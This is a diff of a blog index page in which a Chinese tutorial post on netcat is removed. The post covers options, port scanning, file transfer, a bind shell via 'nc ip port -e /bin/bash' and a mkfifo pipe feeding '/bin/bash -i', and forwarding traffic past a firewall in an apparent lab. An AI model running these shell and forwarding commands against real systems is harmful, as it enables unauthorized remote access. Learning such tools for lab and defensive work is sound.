-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/21/java/interface/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-security/netcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/17/security/netcat/">netcat</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/17/security/netcat/" class="archive-article-date">
-  	<time datetime="2019-01-17T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>
-<h4 id="1-常用参数："><a href="#1-常用参数：" class="headerlink" title="1.常用参数："></a>1.常用参数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-4/6 使用IPv4/6地址</span><br><span class="line">-b 允许broadcast广播</span><br><span class="line">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class="line">-d 不尝试读取stdin</span><br><span class="line">-I length 设置TCP接收的buffer的大小</span><br><span class="line">-i interval 设置发送和接收间的延迟秒数，</span><br><span class="line">-l 监听模式</span><br><span class="line">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class="line">-o length  设置TCP发送的buffer大小</span><br><span class="line">-P 代理名字</span><br><span class="line">-p nc使用的端口</span><br><span class="line">-v verbose更多输出信息</span><br><span class="line">-w timeout</span><br><span class="line">-u 使用UDP</span><br><span class="line">-r 随机选择端口</span><br><span class="line">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>
-<h4 id="2-使用例子"><a href="#2-使用例子" class="headerlink" title="2.使用例子"></a>2.使用例子</h4><h5 id="1-建立连接，聊天"><a href="#1-建立连接，聊天" class="headerlink" title="1.建立连接，聊天"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;
-nc ip port 在其它主机与之建立连接（默认TCP），发送消息
-</code></pre><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;
-nc -v -n -z ip port(可以是范围)&lt;br&gt;
-    -v进行详细输出&lt;br&gt;
-    -n不进行域名查询&lt;br&gt;
-    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;
-</code></pre><h5 id="3-数据传输-甚至可以传输流媒体）"><a href="#3-数据传输-甚至可以传输流媒体）" class="headerlink" title="3.数据传输(甚至可以传输流媒体）"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;
-server:  nc -l port &lt; file1.txt&lt;br&gt;
-clien: nc -n ip port &gt; file2txt&lt;br&gt;
-file1往file2传数据&lt;br&gt;
-</code></pre><h5 id="4-获取shell，正反向shell"><a href="#4-获取shell，正反向shell" class="headerlink" title="4.获取shell，正反向shell"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;
-无-e参数时:&lt;br&gt;
-server:&lt;br&gt;
-mkfifo /tmp/fifo&lt;br&gt;
-cat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;
-client:&lt;br&gt;
-nc ip port&lt;br&gt;
-原理：&lt;br&gt;
-bash -i 进入交互模式&lt;br&gt;
-通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环
-</code></pre><h5 id="5-端口转发"><a href="#5-端口转发" class="headerlink" title="5.端口转发"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
-- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
-原理：&lt;br&gt;
-在102上：nc -l 8000&lt;br&gt;
-              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo
-在103上：&lt;br&gt;
-        nc 192.168.1.102 9000&lt;br&gt;
-在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/17/security/netcat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
@@ -1078,11 +1079,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">springboot</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">java</a>
+                <a href="javascript:void(0)" class="js-tag color1">springboot</a>
               </li>
              
               <li class="article-tag-list-item">
